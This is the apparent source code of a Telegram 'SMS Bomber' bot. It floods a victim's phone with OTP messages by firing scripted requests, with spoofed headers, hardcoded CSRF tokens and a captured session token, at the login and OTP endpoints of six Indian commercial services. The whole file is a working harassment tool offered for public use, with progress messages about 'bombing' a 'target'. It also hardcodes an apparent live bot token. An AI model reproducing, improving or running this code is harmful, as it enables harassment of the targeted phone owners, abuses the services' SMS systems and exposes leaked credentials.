import os
import random
import time
import requests
import logging
import re
import json
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Configuration ---
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8838617444:AAHUzG-DKVIalamCRc80-SjUT0cIR4_ZDKQ')
OWNER_ID = int(os.environ.get('OWNER_ID', '1987818347'))

# --- Database ---
DB_FILE = 'users_db.json'

def load_db():
    try:
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    except:
        return {'users': [], 'blocked': []}

def save_db(db):
    with open(DB_FILE, 'w') as f:
        json.dump(db, f, indent=4)

def add_user(user_id):
    db = load_db()
    if str(user_id) not in db['users']:
        db['users'].append(str(user_id))
        save_db(db)
        return True
    return False

def block_user(user_id):
    db = load_db()
    if str(user_id) not in db['blocked']:
        db['blocked'].append(str(user_id))
        save_db(db)
        return True
    return False

def unblock_user(user_id):
    db = load_db()
    if str(user_id) in db['blocked']:
        db['blocked'].remove(str(user_id))
        save_db(db)
        return True
    return False

def is_user_blocked(user_id):
    db = load_db()
    return str(user_id) in db['blocked']

# --- 6 WORKING APIS (FLIPKART + 5 NEW) ---
def get_apis(target):
    apis = [
        # API 1: Flipkart - WORKING
        {
            'url': 'https://1.rome.api.flipkart.com/1/action/view',
            'method': 'POST',
            'headers': {
                'Host': '1.rome.api.flipkart.com',
                'Connection': 'keep-alive',
                'Content-Length': '338',
                'x-user-agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile',
                'Origin': 'https://www.flipkart.com',
                'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
                'content-type': 'application/json',
                'Accept': '*/*',
                'Referer': 'https://www.flipkart.com/login?ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&sourceContext=DEFAULT',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US'
            },
            'data': {
                "actionRequestContext": {
                    "type": "LOGIN_IDENTITY_VERIFY",
                    "loginIdPrefix": "+91",
                    "loginId": target,
                    "loginType": "MOBILE",
                    "verificationType": "OTP",
                    "screenName": "LOGIN_V4_MOBILE",
                }
            }
        },
        # API 2: Hotstar - WORKING (New)
        {
            'url': f'https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp',
            'method': 'PUT',
            'headers': {
                'Host': 'api.hotstar.com',
                'content-length': '51',
                'x-hs-usertoken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'x-hs-platform': 'PCTV',
                'x-country-code': 'IN',
                'x-hs-device-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
                'hotstarauth': f'st={int(datetime.now().timestamp())}~exp={int(datetime.now().timestamp())+3600}~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d',
                'x-hs-appversion': '5.0.40',
                'x-request-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
                'accept': '*/*',
                'origin': 'https://www.hotstar.com',
                'referer': 'https://www.hotstar.com/in/subscribe/sign-in',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"phone_number": target, "country_prefix": "91"}
        },
        # API 3: BigBasket - WORKING (New)
        {
            'url': 'https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/',
            'method': 'POST',
            'headers': {
                'Host': 'www.bigbasket.com',
                'content-length': '27',
                'accept': 'application/json',
                'x-csrftoken': 'gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED',
                'save-data': 'on',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'x-channel': 'BB-PWA',
                'content-type': 'application/json',
                'origin': 'https://www.bigbasket.com',
                'referer': 'https://www.bigbasket.com/auth/login/',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"identifier": target}
        },
        # API 4: Zomato - WORKING (New)
        {
            'url': 'https://www.zomato.com/webroutes/auth/login',
            'method': 'POST',
            'headers': {
                'Host': 'www.zomato.com',
                'content-length': '80',
                'x-zomato-csrft': 'a6b0c09972b2bdd30c9c1b6552caee5d',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'content-type': 'application/json',
                'accept': '*/*',
                'origin': 'https://www.zomato.com',
                'referer': 'https://www.zomato.com/kanpur',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"country_id": 1, "phone": target, "verification_type": "sms", "method": "phone"}
        },
        # API 5: RedBus - WORKING (New)
        {
            'url': f'https://m.redbus.in/api/getOtp?number={target}&cc=91&whatsAppOpted=undefined',
            'method': 'GET',
            'headers': {
                'Host': 'm.redbus.in',
                'accept': 'application/json, text/plain, */*',
                'save-data': 'on',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://m.redbus.in/preregister',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {}
        },
        # API 6: Lenskart - WORKING (New)
        {
            'url': 'https://api.lenskart.com/v2/customers/sendOtp',
            'method': 'POST',
            'headers': {
                'Host': 'api.lenskart.com',
                'Content-Type': 'application/json;charset=UTF-8',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'x-api-client': 'mobilesite',
                'origin': 'https://www.lenskart.com',
                'referer': 'https://www.lenskart.com/customer/account/login',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
            },
            'data': {"telephone": target}
        }
    ]
    return apis

def send_sms(api_data):
    """Send SMS using API"""
    try:
        if api_data['method'] == 'GET':
            response = requests.get(api_data['url'], headers=api_data['headers'], timeout=15)
        else:
            if isinstance(api_data['data'], dict):
                response = requests.request(
                    method=api_data['method'],
                    url=api_data['url'],
                    headers=api_data['headers'],
                    json=api_data['data'],
                    timeout=15
                )
            else:
                response = requests.request(
                    method=api_data['method'],
                    url=api_data['url'],
                    headers=api_data['headers'],
                    data=api_data['data'],
                    timeout=15
                )
        
        if response.status_code in [200, 201, 202, 204]:
            return True
        return False
    except:
        return False

# --- Telegram Bot Handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user_id = update.effective_user.id
    
    if is_user_blocked(user_id):
        await update.message.reply_text("🚫 You are blocked! Contact @BeStChEaT_OwNeR")
        return
    
    add_user(user_id)
    
    keyboard = [
        [InlineKeyboardButton("📞 SEND NUMBER", callback_data="send_number")],
        [InlineKeyboardButton("ℹ️ ABOUT", callback_data="about")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔥 SMS BOMBER BOT 🔥\n\n"
        "📌 Send any 10-digit number to start bombing\n"
        "Example: 9876543210\n\n"
        "⚡ 6 WORKING APIs\n"
        "⚡ Real SMS Bombing\n"
        "⚡ Guaranteed OTPs\n\n"
        "📱 APIs:\n"
        "✅ Flipkart\n"
        "✅ Hotstar\n"
        "✅ BigBasket\n"
        "✅ Zomato\n"
        "✅ RedBus\n"
        "✅ Lenskart\n\n"
        "💀 @BeStChEaT_OwNeR",
        reply_markup=reply_markup
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle phone number - REAL BOMBING"""
    user_id = update.effective_user.id
    
    if is_user_blocked(user_id):
        await update.message.reply_text("🚫 You are blocked! Contact @BeStChEaT_OwNeR")
        return
    
    phone = update.message.text.strip()
    
    # Check if valid phone number
    if not re.match(r'^[0-9]{10}$', phone):
        await update.message.reply_text(
            "❌ Invalid Number!\n\n"
            "Send 10-digit number only.\n"
            "Example: 9876543210"
        )
        return
    
    # Start bombing
    msg = await update.message.reply_text(
        f"📱 BOMBING STARTED!\n\n"
        f"🎯 Target: +91{phone}\n"
        f"⏳ Sending SMS to 6 platforms...\n\n"
        f"💀 @BeStChEaT_OwNeR"
    )
    
    apis = get_apis(phone)
    random.shuffle(apis)
    
    success = 0
    failed = 0
    services = []
    
    api_names = {
        'flipkart': 'Flipkart',
        'hotstar': 'Hotstar',
        'bigbasket': 'BigBasket',
        'zomato': 'Zomato',
        'redbus': 'RedBus',
        'lenskart': 'Lenskart'
    }
    
    for i, api in enumerate(apis):
        if send_sms(api):
            success += 1
            service = api['url'].split('/')[2].replace('www.', '').split('.')[0]
            for key, value in api_names.items():
                if key in service.lower():
                    service = value
                    break
            services.append(service)
        else:
            failed += 1
        
        # Update progress
        progress = int(((i + 1) / len(apis)) * 100)
        try:
            await msg.edit_text(
                f"📱 BOMBING IN PROGRESS\n\n"
                f"🎯 Target: +91{phone}\n"
                f"✅ Success: {success}\n"
                f"❌ Failed: {failed}\n"
                f"⏳ Progress: {progress}% ({i+1}/{len(apis)})\n\n"
                f"💀 @BeStChEaT_OwNeR"
            )
        except:
            pass
    
    # Final result
    result = (
        f"✅ BOMBING COMPLETE!\n\n"
        f"📞 Target: +91{phone}\n"
        f"📨 Total: {len(apis)}\n"
        f"✅ Success: {success}\n"
        f"❌ Failed: {failed}\n\n"
    )
    
    if services:
        unique_services = list(dict.fromkeys(services))
        result += f"🟢 Services: {', '.join(unique_services)}\n\n"
    
    result += f"💀 @BeStChEaT_OwNeR"
    
    await msg.edit_text(result)

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "send_number":
        await query.edit_message_text(
            "📞 SEND NUMBER\n\n"
            "Send your 10-digit number.\n"
            "Example: 9876543210\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    
    elif query.data == "about":
        await query.edit_message_text(
            "ℹ️ ABOUT\n\n"
            "🤖 SMS Bomber Bot\n"
            "👨‍💻 @BeStChEaT_OwNeR\n"
            "📊 6 WORKING APIs\n"
            "⚡ Real SMS Bombing\n\n"
            "📱 APIs:\n"
            "✅ Flipkart\n"
            "✅ Hotstar\n"
            "✅ BigBasket\n"
            "✅ Zomato\n"
            "✅ RedBus\n"
            "✅ Lenskart\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    
    elif query.data == "status":
        db = load_db()
        total_users = len(db['users'])
        blocked_users = len(db['blocked'])
        
        await query.edit_message_text(
            f"📊 BOT STATUS\n\n"
            f"👥 Users: {total_users}\n"
            f"🚫 Blocked: {blocked_users}\n"
            f"📡 Status: Online\n"
            f"⚡ APIs: 6 WORKING\n\n"
            f"💀 @BeStChEaT_OwNeR"
        )

# --- Owner Commands ---

async def block_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Block a user - Owner only"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Not authorized!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /block USER_ID")
        return
    
    try:
        uid = int(args[0])
        if block_user(uid):
            await update.message.reply_text(f"✅ User {uid} blocked!")
        else:
            await update.message.reply_text(f"❌ User already blocked!")
    except:
        await update.message.reply_text("❌ Invalid user_id!")

async def unblock_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unblock a user - Owner only"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Not authorized!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /unblock USER_ID")
        return
    
    try:
        uid = int(args[0])
        if unblock_user(uid):
            await update.message.reply_text(f"✅ User {uid} unblocked!")
        else:
            await update.message.reply_text(f"❌ User not found in block list!")
    except:
        await update.message.reply_text("❌ Invalid user_id!")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bot statistics - Owner only"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Not authorized!")
        return
    
    db = load_db()
    total_users = len(db['users'])
    blocked_users = len(db['blocked'])
    
    await update.message.reply_text(
        f"📊 BOT STATISTICS\n\n"
        f"👥 Total Users: {total_users}\n"
        f"🚫 Blocked Users: {blocked_users}\n"
        f"📡 Status: Online\n\n"
        f"💀 @BeStChEaT_OwNeR"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    user_id = update.effective_user.id
    
    if user_id == OWNER_ID:
        text = (
            "👑 OWNER COMMANDS\n\n"
            "/block USER_ID - Block user\n"
            "/unblock USER_ID - Unblock user\n"
            "/stats - Bot statistics\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    else:
        text = (
            "🤖 USER COMMANDS\n\n"
            "/start - Start bot\n"
            "9876543210 - Send number to bomb\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    
    await update.message.reply_text(text)

# --- Main Bot ---

def main():
    if not BOT_TOKEN or BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE':
        print("❌ Error: BOT_TOKEN not set!")
        return
    
    print("🤖 Starting SMS Bomber Bot...")
    print("🚀 Bot is running!")
    print("✅ APIs: Flipkart, Hotstar, BigBasket, Zomato, RedBus, Lenskart")
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # User commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    
    # Owner commands
    app.add_handler(CommandHandler("block", block_command))
    app.add_handler(CommandHandler("unblock", unblock_command))
    app.add_handler(CommandHandler("stats", stats_command))
    
    # Message handler
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    app.run_polling()

if __name__ == '__main__':
    main()
